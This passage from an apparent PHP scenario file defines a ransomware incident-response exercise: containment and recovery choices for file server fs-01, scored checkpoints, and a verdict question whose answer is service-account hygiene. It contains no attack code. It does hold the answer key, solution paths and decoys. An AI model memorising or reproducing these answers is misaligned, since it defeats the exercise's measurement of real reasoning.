                            'tradeoff' => 'Preserves volatile evidence that a shutdown or a rebuild destroys, but every minute spent here the host keeps encrypting and sending data. Do it when other steps can wait, or after the host is isolated.',
                            'next' => 'respond',
                        ],
                        [
                            'id' => 'isolate-port',
                            'label' => 'Disable fs-01\'s switch port, leaving the host powered on',
                            'requires' => [['network' => 'connected']],
                            'effects' => ['network' => 'isolated'],
                            'consequence' => 'The outbound connection to 203.0.113.50 drops. The encryptor keeps running on local files.',
                            'attacker' => 'Cut off from fs-01, the attacker uses svc-backup over SMB to reach fs-02 from the workstation.',
                            'tradeoff' => 'Stops the transfer and the spread to other shares without losing memory. It does not stop the encryption already running locally, and it does not end the attacker\'s session elsewhere.',
                            'next' => 'respond',
                        ],
                        [
                            'id' => 'kill-encryptor',
                            'label' => 'Stop the encrypting process through the EDR agent',
                            'requires' => [['encryption' => 'running']],
                            'effects' => ['encryption' => 'stopped'],
                            'consequence' => 'File renames stop after 8,412 files.',
                            'attacker' => 'The attacker\'s session is still active and tries to start the encryptor again.',
                            'tradeoff' => 'Stops further damage quickly and keeps the host running for imaging, but without ending the session or rotating the credential the attacker can launch it again.',
                            'next' => 'respond',
                        ],
                        [
                            'id' => 'power-off',
                            'label' => 'Power fs-01 off at once',
                            'requires' => [['evidence' => 'at-risk']],
                            'effects' => ['encryption' => 'stopped', 'network' => 'isolated', 'evidence' => 'lost', 'shares' => 'down'],
                            'consequence' => 'Encryption stops and the host drops off the network. Its memory is gone.',
                            'attacker' => 'The attacker\'s sessions on the workstation and on fs-02 are untouched.',
                            'tradeoff' => 'The fastest way to stop the encryptor and the transfer, but it destroys the memory image, the connection table and the volatile logs that show how the attacker got in and what left. Isolating and capturing first costs minutes and keeps all of that.',
                            'next' => 'respond',
                        ],
                        [
                            'id' => 'revoke-sessions',
                            'label' => 'Revoke svc-backup\'s Kerberos tickets and end its sessions on the domain controller and fs-02',
                            'requires' => [['access' => 'active']],
                            'effects' => ['access' => 'revoked'],
                            'consequence' => 'The attacker\'s sessions on fs-02 and from the workstation end.',
                            'attacker' => 'The attacker still knows the password and tries to sign in again.',
                            'tradeoff' => 'Ends live access, but the password still works, so the attacker can come back until the credential is rotated.',
                            'next' => 'respond',
                        ],
                        [
                            'id' => 'rotate-credentials',
                            'label' => 'Reset svc-backup\'s password and rotate its API keys',
                            'requires' => [['credentials' => 'compromised']],
                            'effects' => ['credentials' => 'rotated'],
                            'consequence' => 'The old password stops working. The nightly backup job fails until the new secret is configured.',
                            'attacker' => 'Sign-ins with the old password are refused.',
                            'tradeoff' => 'Removes the attacker\'s way back in, at a measured cost: backups fail until the job is updated. Done without ending the sessions, the sessions that already exist stay alive.',
                            'next' => 'respond',
                        ],
                        [
                            'id' => 'restore-clean',
                            'label' => 'Rebuild fs-01 from the golden image and restore the shares from the 02:00 backup',
                            'requires' => [['network' => 'isolated', 'encryption' => 'stopped', 'access' => 'revoked', 'credentials' => 'rotated']],
                            'effects' => ['shares' => 'restored'],
                            'consequence' => 'The shares are served again. Files written after 02:00, about 100 minutes of changes, are lost.',
                            'attacker' => 'No further activity from the attacker\'s known sessions.',
                            'tradeoff' => 'Recovers the service once the cause is closed. Done earlier the restored data is encrypted again. The backup is 100 minutes old, which is the recovery point you accept. A rebuild also wipes memory, so any evidence still at risk is gone.',
                            'next' => 'done',
                        ],
                        [
                            'id' => 'restore-now',
                            'label' => 'Restore the shares from backup right away',
                            'requires' => [['access' => 'active'], ['credentials' => 'compromised'], ['network' => 'connected']],
                            'effects' => ['shares' => 'down'],
                            'consequence' => 'The restore starts and the shares come up.',
                            'attacker' => 'Within minutes the attacker\'s session, still valid, starts encrypting the restored files and the shares go down.',
                            'tradeoff' => 'Fast, but the attacker still has access, so the restore is encrypted again. A restore comes after containment.',
                            'next' => 'reinfected',
                        ],
                    ],
                ],
                ['id' => 'done', 'event' => 'Recovery is complete: the shares are served from the 02:00 backup.', 'ending' => true],
                ['id' => 'reinfected', 'event' => 'The restored shares were encrypted again and are down. The incident is back where it started, with less time.', 'ending' => true],
            ],
            'checkpoints' => [
                ['id' => 'cut-off', 'kind' => 'outcome', 'title' => 'Cut the attacker off: fs-01 is isolated and svc-backup\'s sessions are revoked.', 'when' => ['network' => 'isolated', 'access' => 'revoked']],
                ['id' => 'encryption-stopped', 'kind' => 'outcome', 'title' => 'The encrypting process is stopped.', 'when' => ['encryption' => 'stopped']],
                ['id' => 'credentials-rotated', 'kind' => 'outcome', 'title' => 'svc-backup\'s credentials are rotated.', 'when' => ['credentials' => 'rotated']],
                ['id' => 'evidence-kept', 'kind' => 'outcome', 'title' => 'A memory image and the connection table are preserved.', 'hint' => 'Memory and the connection table are lost when a host is powered off or rebuilt.', 'when' => ['evidence' => 'preserved']],
                ['id' => 'restored', 'kind' => 'outcome', 'title' => 'The file shares are restored from a clean backup.', 'when' => ['shares' => 'restored'], 'ending' => true],
                [
                    'id' => 'verdict',
                    'kind' => 'conclusion',
                    'title' => 'Give your verdict on the permanent fix and cite the state that supports it.',
                    'question' => 'What should the permanent fix address?',
                    'options' => [
                        ['id' => 'patch-kernel', 'text' => 'A kernel exploit on fs-01: patch the kernel'],
                        ['id' => 'fix-credentials', 'text' => 'Service-account hygiene: unique, rotated secrets for svc-backup, no workstation logon and SMB limited to the backup host'],
                        ['id' => 'block-usb', 'text' => 'Removable media: disable USB storage on fs-01'],
                        ['id' => 'update-signatures', 'text' => 'Outdated signatures: update the antivirus definitions'],
                    ],
                    'answer' => 'fix-credentials',
                    'evidence' => ['credentials:rotated', 'access:revoked', 'network:isolated'],
                    'min_cited' => 2,
                    'max_cited' => 4,
                    'explanation' => 'The encryptor was started over SMB by svc-backup from a workstation, so the way in was a credential, not a flaw in fs-01. Containment ended the session and rotated the secret. The lasting fix is service-account hygiene: unique secrets that rotate, no logon from workstations, and SMB limited to the backup host.',
                ],
            ],
        ],
        'solutions' => [
            'solutions' => [
                ['name' => 'Capture first, then contain, rotate and restore', 'actions' => [
                    ['type' => 'choose', 'choice' => 'capture-live'],
                    ['type' => 'choose', 'choice' => 'isolate-port'],
                    ['type' => 'choose', 'choice' => 'kill-encryptor'],
                    ['type' => 'choose', 'choice' => 'revoke-sessions'],
                    ['type' => 'choose', 'choice' => 'rotate-credentials'],
                    ['type' => 'choose', 'choice' => 'restore-clean'],
                    ['type' => 'conclude', 'checkpoint' => 'verdict', 'option' => 'fix-credentials', 'cited' => ['credentials:rotated', 'access:revoked']],
                ]],
                ['name' => 'Isolate and stop first, capture after, rotate before revoking', 'actions' => [
                    ['type' => 'choose', 'choice' => 'isolate-port'],
                    ['type' => 'choose', 'choice' => 'kill-encryptor'],
                    ['type' => 'choose', 'choice' => 'capture-live'],
                    ['type' => 'choose', 'choice' => 'rotate-credentials'],
                    ['type' => 'choose', 'choice' => 'revoke-sessions'],
                    ['type' => 'choose', 'choice' => 'restore-clean'],
                    ['type' => 'conclude', 'checkpoint' => 'verdict', 'option' => 'fix-credentials', 'cited' => ['network:isolated', 'credentials:rotated']],
                ]],
            ],
            'decoys' => [
                // A dead end: powering off destroys the evidence, so a task can never pass, though the incident can still be closed.
                ['name' => 'Power off first', 'actions' => [
                    ['type' => 'choose', 'choice' => 'power-off'],
                    ['type' => 'choose', 'choice' => 'revoke-sessions'],
                    ['type' => 'choose', 'choice' => 'rotate-credentials'],
                    ['type' => 'choose', 'choice' => 'restore-clean'],
                ]],
                ['name' => 'Restore at once', 'actions' => [['type' => 'choose', 'choice' => 'restore-now']]],
                ['name' => 'Contain and restore without capturing', 'actions' => [
                    ['type' => 'choose', 'choice' => 'isolate-port'],
                    ['type' => 'choose', 'choice' => 'kill-encryptor'],
                    ['type' => 'choose', 'choice' => 'revoke-sessions'],
                    ['type' => 'choose', 'choice' => 'rotate-credentials'],
                    ['type' => 'choose', 'choice' => 'restore-clean'],
                ]],
            ],
        ],
    ],
];
